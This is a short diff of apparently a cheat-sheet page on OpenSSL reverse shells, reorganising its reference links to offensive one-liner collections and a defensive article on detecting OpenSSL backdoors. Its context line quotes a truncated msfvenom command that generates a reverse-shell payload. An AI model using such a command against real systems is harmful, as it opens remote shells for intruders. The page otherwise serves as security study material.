@@ -17,10 +17,18 @@ $ msfvenom -p cmd/unix/reverse_openssl handlersslcert=[/path/to/file.pem] sslver
 ---
 ## References
 
-- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
 
+### Hacktricks
+
+- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
+
+### Rio Asmara Suryadi
+
 - [Rio Asmara Suryadi: OpenSSL for Reverse Shell](https://rioasmara.com/2020/06/22/openssl-for-reverse-shell/)
+
+### Sandfly Security
 
 - [Sandfly Security: Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)
